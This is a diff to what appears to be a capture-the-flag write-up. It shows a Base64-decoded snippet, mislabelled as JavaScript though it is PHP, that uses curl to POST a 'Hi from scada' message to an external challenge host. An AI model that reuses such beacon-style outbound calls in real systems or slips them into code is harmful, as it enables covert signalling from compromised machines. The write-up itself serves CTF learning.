@@ -49,14 +49,18 @@ There's a Base64-encoded portion, which I used [CyberChef](https://gchq.github.i
 
 ![Screenshot from 2021-11-02 22-11-49](https://user-images.githubusercontent.com/82754379/139863889-85bcb128-5de8-43d3-94a9-221995914161.png)
 
-<br>
+---
+
+Here is the prettified Javascript:
 
 ```javascript
 $ch=curl_init();
 curl_setopt($ch,CURLOPT_URL,"http://s0pq6slfaunwbtmysg62yzmoddaw7ppj.ctf.sg:18926/xcvlosxgbtfcofovywbxdawregjbzqta.php");
-curl_setopt($ch,CURLOPT_POST,1);curl_setopt($ch,CURLOPT_POSTFIELDS,"14c4b06b824ec593239362517f538b29=Hi%20from%20scada");
+curl_setopt($ch,CURLOPT_POST,1);
+curl_setopt($ch,CURLOPT_POSTFIELDS,"14c4b06b824ec593239362517f538b29=Hi%20from%20scada");
 $server_output=curl_exec($ch);
 ```
 
+---
 
 
